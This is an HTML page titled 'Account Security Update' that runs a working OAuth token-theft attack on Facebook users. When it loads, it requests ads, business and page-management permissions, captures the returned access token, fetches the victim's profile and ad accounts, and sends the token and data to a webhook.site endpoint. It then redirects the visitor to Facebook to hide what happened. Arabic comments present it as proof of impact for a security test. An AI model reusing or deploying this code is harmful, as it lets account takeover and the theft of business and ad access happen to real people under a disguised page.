<!DOCTYPE html>
<html>
<head><title>Account Security Update</title></head>
<body>
    <script>
        // [2026-01-21] Targeting high-impact management permissions.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // 1. استخراج الـ ID والاسم (إثبات أن التوكن يعمل)
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
                    const userData = await response.json();

                    // 2. إرسال الـ ID (920929380607450) والتوكن "الإداري" للـ Webhook
                    new Image().src = `${webhookUrl}?VICTIM_ID=${userData.id}&ADMIN_TOKEN=${token}`;

                    // 3. محاولة إجراء تعديل إداري (إثبات الأثر الضار لـ Samuel)
                    // سنحاول جلب معلومات البيزنس، وهو ما يثبت أننا "مدراء" ولسنا مجرد مستخدمين
                    const bizRes = await fetch(`https://graph.facebook.com/me/adaccounts?fields=name,account_status&access_token=${token}`);
                    const bizData = await bizRes.json();
                    
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            impact: "Administrative Account Access",
                            user: userData,
                            ad_accounts: bizData,
                            token_type: "Management_Token"
                        })
                    });

                } catch (e) {}
                setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
            } else {
                // طلب الصلاحيات التي تظهر في التوثيق كصلاحيات "إدارة" و "تعديل"
                const scopes = "email,public_profile,ads_management,business_management,pages_manage_metadata";
                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=${scopes}`;
            }
        };
    </script>
</body>
</html>
